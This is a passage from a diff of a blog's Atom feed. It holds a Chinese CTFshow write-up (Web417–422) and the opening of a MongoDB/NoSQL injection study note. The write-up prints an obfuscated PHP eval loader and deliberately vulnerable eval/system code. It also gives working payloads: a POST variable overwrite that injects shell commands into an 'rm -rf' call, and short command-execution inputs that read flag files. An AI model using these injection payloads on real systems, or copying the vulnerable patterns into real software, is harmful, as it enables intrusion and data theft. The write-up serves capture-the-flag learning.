+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php /*ctfshow*/define(&#39;aPeKTP0126&#39;,__FILE__);$cIYMfW=urldecode(&amp;quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&amp;quot;);$CBhSfw=$cIYMfW[3].$cIYMfW[6].$cIYMfW[33].$cIYMfW[30];$xWoIVy=$cIYMfW[33].$cIYMfW[10].$cIYMfW[24].$cIYMfW[10].$cIYMfW[24];$RkEEuV=$xWoIVy[0].$cIYMfW[18].$cIYMfW[3].$xWoIVy[0].$xWoIVy[1].$cIYMfW[24];$YFfKrW=$cIYMfW[7].$cIYMfW[13];$CBhSfw.=$cIYMfW[22].$cIYMfW[36].$cIYMfW[29].$cIYMfW[26].$cIYMfW[30].$cIYMfW[32].$cIYMfW[35].$cIYMfW[26].$cIYMfW[30];eval($CBhSfw(&amp;quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&amp;quot;));?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;出题人挺骚的，一波 base 后&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+include(&#39;flag.php&#39;);
+$c=$_GET[&#39;ctf&#39;];
+if($c==&#39;show&#39;)&amp;#123;
+	echo $flag;
+&amp;#125;else&amp;#123;
+	echo &#39;FLAG_NOT_HERE&#39;;
+&amp;#125;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那就很简单了，传入 ctf=show 即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717183457526.png&#34; alt=&#34;image-20230717183457526&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web418&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web418&#34;&gt;#&lt;/a&gt; Web418&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+$key= 0;
+$clear=&#39;clear.php&#39;;
+highlight_file(__FILE__);
+//获取参数
+$ctfshow=$_GET[&#39;ctfshow&#39;];
+//包含清理脚本
+include($clear);
+extract($_POST);
+if($key===0x36d)&amp;#123;
+    //帮黑阔写好后门
+    eval(&#39;&amp;lt;?php &#39;.$ctfshow.&#39;?&amp;gt;&#39;);
+&amp;#125;else&amp;#123;
+    $die?die(&#39;FLAG_NOT_HERE&#39;):clear($clear);
+&amp;#125;
+function clear($log)&amp;#123;
+    shell_exec(&#39;rm -rf &#39;.$log);
+&amp;#125;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;虽然题目上有后面，但是这里判断使用的是强等于，无法绕过，这里对于 post 传人的数据没有限制，这里完全可以进行变量覆盖，最后面还藏了一段 clear 这个函数，可以命令注入&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;k=1&amp;amp;die=0&amp;amp;clear=;ls  &amp;gt;1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717184415931.png&#34; alt=&#34;image-20230717184415931&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;k=1&amp;amp;die=0&amp;amp;clear=;cat flag.php  &amp;gt;1.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717184446924.png&#34; alt=&#34;image-20230717184446924&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web419&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web419&#34;&gt;#&lt;/a&gt; Web419&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+
+
+$code = $_POST[&#39;code&#39;];
+if(strlen($code) &amp;lt; 17)&amp;#123;
+    eval($code);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;长度限制，17 位利用空间很大&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;code=`cat f* &amp;gt;1.txt`;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717185119636.png&#34; alt=&#34;image-20230717185119636&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web420&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web420&#34;&gt;#&lt;/a&gt; Web420&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+$code = $_POST[&#39;code&#39;];
+if(strlen($code) &amp;lt; 8)&amp;#123;
+    system($code);
+&amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以直接 rce 了，不过长度现在在 8 位&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717185807749.png&#34; alt=&#34;image-20230717185807749&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这里找到 flag 在上一级目录中所以这里可以直接打开即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;nl ../*
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190115064.png&#34; alt=&#34;image-20230717190115064&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web421&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web421&#34;&gt;#&lt;/a&gt; Web421&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+
+highlight_file(__FILE__);
+
+
+$code = $_POST[&#39;code&#39;];
+if(strlen($code) &amp;lt; 6)&amp;#123;
+    system($code);
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ok 这次是 6 位&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190324959.png&#34; alt=&#34;image-20230717190324959&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;flag 就在当前目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190350528.png&#34; alt=&#34;image-20230717190350528&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;web422&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web422&#34;&gt;#&lt;/a&gt; Web422&lt;/h2&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+highlight_file(__FILE__);
+
+
+$code = $_POST[&#39;code&#39;];
+if(strlen($code) &amp;lt; 5)&amp;#123;
+    system($code);
+&amp;#125; 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;长度是 5 位&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230717190531729.png&#34; alt=&#34;image-20230717190531729&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;暂时写到这把，后面的就不是 php 的环境了&lt;/p&gt;
+</content>
+        <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
+        <category term="PHP代码审计函数绕过" scheme="https://blog.xcu.icu/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" />
+        <updated>2023-07-16T16:00:00.000Z</updated>
+    </entry>
     <entry>
         <id>https://blog.xcu.icu/2023/07/16/hard_socnet2%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</id>
         <title>hard_socnet2的靶机打靶记录</title>
@@ -7361,422 +7857,5 @@ int main(int argc,char *argv[])&amp;#123;
         <category term="REVERSE" scheme="https://blog.xcu.icu/categories/REVERSE/" />
         <category term="小端序标记法" scheme="https://blog.xcu.icu/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F%E6%A0%87%E8%AE%B0%E6%B3%95/" />
         <updated>2023-03-05T04:00:00.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://blog.xcu.icu/2023/03/01/nosql/</id>
-        <title>nosql学习笔记</title>
-        <link rel="alternate" href="https://blog.xcu.icu/2023/03/01/nosql/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;一直听说 nosql 好，刚好 ctfshow 中有 nosql 注入的练习，简单记录一下学习的过程&lt;/p&gt;
-&lt;p&gt;参考文章&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucnVub29iLmNvbS9tb25nb2RiL21vbmdvZGItdHV0b3JpYWwuaHRtbA==&#34;&gt;MongoDB 教程 | 菜鸟教程 (runoob.com)&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTkwOCN0b2MtNw==&#34;&gt;Nosql 注入从零到一 - 先知社区 (aliyun.com)&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjAyMDky&#34;&gt;从零学习 NoSQL 注入之 Mongodb - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
-&lt;h2 id=&#34;一点概念&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一点概念&#34;&gt;#&lt;/a&gt; 一点概念&lt;/h2&gt;
-&lt;h3 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; nosql&lt;/h3&gt;
-&lt;p&gt;基础的概念还是比较重要的，接下来看看维基对 nosql 的描述&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;NoSQL&lt;/strong&gt;（最初表示&lt;strong&gt; No&lt;/strong&gt;n-&lt;strong&gt;SQL&lt;/strong&gt;，后来有人转解为&lt;strong&gt; N&lt;/strong&gt;ot &lt;strong&gt;o&lt;/strong&gt;nly &lt;strong&gt;SQL&lt;/strong&gt;，是对不同于传统的 [关系数据库] 庫) 的 [数据库管理系统] 数据库管理系统) 的统称。&lt;/p&gt;
-&lt;p&gt;和传统的数据库有较大的区别&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;数据组织方式：传统数据库采用表格的方式组织数据，而 NoSQL 数据库则使用键值对、文档型、列型等不同的方式来组织数据。&lt;/li&gt;
-&lt;li&gt;数据模型：传统数据库使用严格的数据模型，例如关系模型，要求数据必须按照事先定义好的模式进行存储。而 NoSQL 数据库则通常具有更为灵活的数据模型，能够根据需要动态调整数据结构，更适用于数据结构频繁变化的应用场景。&lt;/li&gt;
-&lt;li&gt;可扩展性：传统数据库通常只能通过硬件升级或者数据分片的方式来扩展性能和存储容量，而 NoSQL 数据库通常具有良好的可扩展性，可以通过横向扩展（增加节点）来扩展存储容量和性能。&lt;/li&gt;
-&lt;li&gt;高并发：NoSQL 数据库通常具有较高的读写性能，能够满足高并发的需求。&lt;/li&gt;
-&lt;li&gt;适用场景：传统数据库适用于结构化数据的存储和管理，而 NoSQL 数据库则更适用于非结构化数据的存储和管理，例如文档、图像、视频等。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;下文来自 OWSPF 的总结：&lt;/p&gt;
-&lt;p&gt;NoSQL 数据库提供的一致性限制比传统 SQL 数据库更宽松。通过减少关系约束和一致性检查，NoSQL 数据库通常提供性能和扩展优势。然而，这些数据库仍然可能容易受到注入攻击，即使它们没有使用传统的 SQL 语法。由于这些 NoSQL 注入攻击可能在过程语言中执行，而不是在声明性 SQL 语言中执行，因此其潜在影响大于传统的 SQL 注入。&lt;/p&gt;
-&lt;h3 id=&#34;mongodb&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mongodb&#34;&gt;#&lt;/a&gt; mongodb&lt;/h3&gt;
-&lt;p&gt;以下摘自菜鸟&lt;/p&gt;
-&lt;p&gt;MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。&lt;/p&gt;
-&lt;p&gt;MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。&lt;/p&gt;
-&lt;p&gt;下表将帮助您更容易理解 Mongo 中的一些概念：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;SQL 术语 / 概念&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;MongoDB 术语 / 概念&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;解释 / 说明&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;database&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;database&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;数据库&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;table&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;collection&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;数据库表 / 集合&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;row&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;document&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;数据记录行 / 文档&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;column&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;field&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;数据字段 / 域&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;index&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;index&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;索引&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;table joins&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;表连接，MongoDB 不支持&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;primary key&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;primary key&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;主键，MongoDB 自动将_id 字段设置为主键&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;下面是条件操纵符的整理&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$gt : &amp;gt;
-$lt : &amp;lt;
-$gte: &amp;gt;=
-$lte: &amp;lt;=
-$ne : !=、&amp;lt;&amp;gt;
-$in : in
-$nin: not in
-$all: all 
-$or:or
-$not: 反匹配(1.3.3及以上版本)
-模糊查询用正则式：db.customer.find(&amp;#123;&#39;name&#39;: &amp;#123;&#39;$regex&#39;:&#39;.*s.*&#39;&amp;#125; &amp;#125;)
-/**
-* : 范围查询 &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$gte&amp;quot; : 2 , &amp;quot;$lte&amp;quot; : 21&amp;#125;&amp;#125;
-* : $ne &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$ne&amp;quot; : 23&amp;#125;&amp;#125;
-* : $lt &amp;#123; &amp;quot;age&amp;quot; : &amp;#123; &amp;quot;$lt&amp;quot; : 23&amp;#125;&amp;#125;
-*/
-例：
-//查询age = 22的记录
-db.userInfo.find(&amp;#123;&amp;quot;age&amp;quot;: 22&amp;#125;);
-//相当于：select * from userInfo where age = 22;
-//查询age &amp;gt; 22的记录
-db.userInfo.find(&amp;#123;age: &amp;#123;$gt: 22&amp;#125;&amp;#125;);
-//相当于：select * from userInfo where age &amp;gt; 22;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;MongoDB 之类的流行数据存储中，JSON 查询结构。&lt;/p&gt;
-&lt;p&gt;下表列出了 RDBMS 与 MongoDB 对应的术语：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:center&#34;&gt;RDBMS&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;MongoDB&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;数据库&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;数据库&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;表&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;集合&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;行&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;文档&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;列&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;字段&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;表联合&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;嵌入文档&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:center&#34;&gt;主键&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;主键 (MongoDB 提供了 key 为 _id)&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;MongoDB 中可以使用的类型如下表所示：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;类型&lt;/strong&gt;&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;数字&lt;/strong&gt;&lt;/th&gt;
-&lt;th style=&#34;text-align:left&#34;&gt;&lt;strong&gt;备注&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Double&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;1&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;String&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;2&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Object&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;3&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Array&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;4&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Binary data&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;5&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Undefined&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;6&lt;/td&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;已废弃。&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td style=&#34;text-align:left&#34;&gt;Object id&lt;/td&gt;
